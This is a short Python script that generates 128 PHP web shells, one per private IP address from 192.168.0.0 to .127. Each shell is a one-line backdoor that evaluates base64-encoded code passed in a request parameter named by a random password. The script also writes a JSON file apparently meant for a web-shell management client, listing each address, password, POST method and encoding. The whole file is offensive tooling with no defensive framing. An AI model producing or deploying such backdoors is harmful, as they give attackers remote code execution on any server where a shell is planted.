import json
import random
ans=[]
for i in range(0,128):
    address="192.168.0.%d"%i
    t={
            "address":address,
            "pass":str(random.random()),
            "method":"POST",
            "custom":{
                "addonpost":{},
                "addonget":{},
                "place":"",
                "encrypt":"BASE64_ENCODE",
                "placevalue":""
                }
            }
    ans.append(t)
    f=open("shells/"+address+".php","w")
    f.write("<?php eval(base64_decode($_REQUEST['%s']));"%t["pass"]);
    f.close()
f=open("output.json","w")
f.write(json.dumps(ans))
f.close()
